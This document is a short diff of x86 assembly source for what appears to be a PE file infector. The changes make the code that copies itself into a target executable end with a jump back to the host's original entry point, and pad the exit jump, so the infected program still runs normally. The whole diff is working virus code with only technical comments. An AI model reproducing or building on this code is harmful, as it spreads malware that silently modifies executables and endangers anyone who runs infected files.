@@ -295,10 +295,17 @@ start:
 			sub ecx, 320
 		jmp copy_start
 		copy_end:
+			sub ecx, 6 ; No copying last jmp instruction to old AddressOfEntryPoint (along with nop's)
 			invoke fromStack(fread), fromStack(selfHand), daccess(temp320B), ecx, daccess(tempDword2), 0
 			invoke fromStack(fwrite), fromStack(tgHand), daccess(temp320B), ecx, daccess(tempDword2), 0
 			
-		
+			; Final jmp instruction:
+			; FF 65 XX = jmp [ebp + disp8] (3 bytes) (for 32-bit, only usable if stack_reserved < 32 = 0x20)
+			; FF A5 XX XX XX XX = jmp [ebp + disp32] (6 bytes)
+			mov vaccess(tempDword), 0A5FFh
+			invoke fromStack(fwrite), fromStack(tgHand), daccess(tempDword), 2, daccess(tempDword2), 0
+			mov vaccess(tempDword), stackAddr(AddressOfEntryPoint)
+			invoke fromStack(fwrite), fromStack(tgHand), daccess(tempDword), 4, daccess(tempDword2), 0
 			
 		; Register VirtualSize & SizeOfRawData
 		invoke fromStack(fseek), fromStack(tgHand), 0, 0, SEEK_CUR ; Obtain current position
@@ -360,7 +367,8 @@ start:
     
     to_exit:
     mov esp, ebp
-    jmp exit
+    jmp exit ; expected to be 5 bytes
+    nop
     
 inject ENDS
 end start
